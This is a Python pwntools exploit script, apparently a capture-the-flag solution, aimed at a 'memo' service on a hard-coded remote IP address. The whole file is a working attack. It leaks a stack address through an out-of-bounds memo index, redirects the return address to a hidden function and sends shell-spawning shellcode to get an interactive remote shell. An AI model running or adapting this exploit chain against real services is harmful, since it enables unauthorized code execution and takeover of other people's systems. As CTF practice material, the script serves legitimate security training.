#!/usr/bin/env python2

from pwn import *
context.log_level = "DEBUG"
context.arch = 'amd64'
#r = process("memo")
r = remote("54.202.7.144", 8888)

# set username and password
r.recvuntil(":")
r.sendline("bob")
r.sendline("y")
r.recvuntil(":")
r.send("a" * 0x10)
#print r.recvall()
current_pass = "a" * 0x10
# hidden pad
hidden_pad = 0x400b47
# helpers
def leave_fail(index):
    r.sendline("1")
    r.recvuntil(": ")
    r.sendline(str(index))
    r.recvuntil("index\n")
    r.recvuntil(">> ")

# should each be strings of 0x20 length or bad stuff happens
def set_user_pass(user, password):
    global current_pass
    r.send("5")
    r.recvuntil("Password: ")
    r.send(current_pass)
    r.recvuntil(": ")
    r.send(user)
    r.recvuntil(": ")
    r.sendline(password)
    r.recvuntil(">> ")
    current_pass = password

# note: -6 is correct offset for password
# er, -3?
def set_pass_address(address):
    addy = p64(address)
    buf = ('a' * 0x14) + '\x20\x00\x00\x00' + addy
    set_user_pass("bob", buf)

def leak_address(index):
    leave_fail(index)
    r.send("2")
    r.recvuntil("ge: ")
    #r.send("a")
    r.recvuntil("message!\n")
    addy = r.recvline().strip()
    while len(addy) != 8:
        addy += '\x00'
    return u64(addy)
# first, we need to leak our stack address. create a blank memo, read index 5
r.send("1")
r.recvuntil("Index: ")
r.send("0")
r.recvuntil("th: ")
r.send("4")
r.recvuntil("ge: ")
r.send("quan")

# leak stack address
stack_addr = leak_address(5)
log.info("Leaked stack address: " + hex(stack_addr))
# rip is 0x58 behind the return address
rip_addr = stack_addr + 0x58
log.info("Calc'd RIP address: " + hex(rip_addr))
# set the password to the rip address
set_pass_address(rip_addr)
# use fail to get the index right, then write our magic string to it
leave_fail(-3)
r.send("2")
r.recvuntil("ge: ")
r.send(p64(hidden_pad))
r.send('6')
r.send(asm(shellcraft.sh()))
r.interactive()
